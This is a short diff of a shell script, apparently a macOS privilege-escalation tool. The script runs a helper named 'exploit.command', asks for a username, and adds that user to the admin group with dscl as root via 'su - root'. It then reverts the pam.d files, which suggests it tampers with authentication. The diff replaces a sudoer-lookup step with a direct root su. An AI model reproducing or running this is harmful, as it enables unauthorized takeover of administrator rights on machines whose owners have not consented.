@@ -19,9 +19,6 @@ fi
 # Run exploit
 ./helpers/exploit.command
 
-# Find a sudoer
-user=$(./helpers/find_sudoer.command)
-
 # Ask for username to give admin access
 echo ""
 echo "All users:"
@@ -35,7 +32,7 @@ if [ -z "$username" ]; then
 fi
 
 # Give admin access to user
-su - $user -c "sudo dscl . -append /groups/admin GroupMembership $username"
+su - root -c "dscl . -append /groups/admin GroupMembership $username"
 echo "Successfully gave $username admin access"
 
 # Revert pam.d files to original
